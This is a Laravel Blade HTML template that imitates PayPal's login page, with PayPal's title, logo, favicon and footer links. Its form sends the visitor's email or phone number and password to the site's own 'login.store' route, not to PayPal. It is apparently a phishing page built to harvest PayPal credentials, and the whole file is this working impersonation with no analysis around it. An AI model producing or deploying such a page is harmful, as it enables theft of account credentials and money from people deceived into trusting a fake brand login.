<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <link rel="stylesheet" href="{{ asset('css/login.css') }}">
    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" type="image/x-icon">

</head>
<body>
    <div class="container">
    <div class="paypal-logo">
    <img src="{{ asset('images/paypal_logo.png') }}" alt="PayPal Logo" width="120">
</div>

        
        <form action="{{ route('login.store') }}" method="POST" id="loginForm">
            @csrf
            <div class="form-group">
                <input type="text" name="login" class="form-input" id="login" required>

                <label for="email">Email or mobile number</label>
            </div>

            <div class="form-group">
                <input type="password" name="password" class="form-input" id="password" required>
                <label for="password">Enter your password</label>
            </div>

            <div class="forgot-link">
                <a href="#" onclick="handleForgotPassword(); return false;">Forgot password?</a>
            </div>

            <button type="submit" class="btn btn-primary">Log In</button>

            <div class="divider" style="display: flex; align-items: center; text-align: center; margin: 24px 0;">
                <hr style="flex: 1; border: none; border-top: 1px solid #ccc; margin: 0 16px;">
                <span style="font-weight: 500; color: #888;">or</span>
                <hr style="flex: 1; border: none; border-top: 1px solid #ccc; margin: 0 16px;">
            </div>

            <button type="button" class="btn btn-secondary" onclick="handleSignUp()">Sign Up</button>
        </form>

        @if(session('success'))
            <p style="color: green;">{{ session('success') }}</p>
        @endif

        <div class="language-section">
            <div class="language-links">
                <div class="flag"></div>
                <select class="language-dropdown" onchange="handleLanguageChange(this.value)">
                    <option value="en">English</option>
                    <option value="fr">Français</option>
                    <option value="es">Español</option>
                    <option value="zh">中文</option>
                </select>
                <span class="language-separator">|</span>
                <a href="#" id="lang-fr" onclick="changeLanguage('fr'); return false;">Français</a>
                <span class="language-separator">|</span>
                <a href="#" id="lang-es" onclick="changeLanguage('es'); return false;">Español</a>
                <span class="language-separator">|</span>
                <a href="#" id="lang-zh" onclick="changeLanguage('zh'); return false;">中文</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#" onclick="handleFooterLink('contact'); return false;">Contact Us</a>
            <a href="#" onclick="handleFooterLink('privacy'); return false;">Privacy</a>
            <a href="#" onclick="handleFooterLink('legal'); return false;">Legal</a>
            <a href="#" onclick="handleFooterLink('policy'); return false;">Policy Updates</a>
            <a href="#" onclick="handleFooterLink('worldwide'); return false;">Worldwide</a>
        </div>
    </div>

    <script src="{{ asset('js/login.js') }}"></script>
</body>
</html>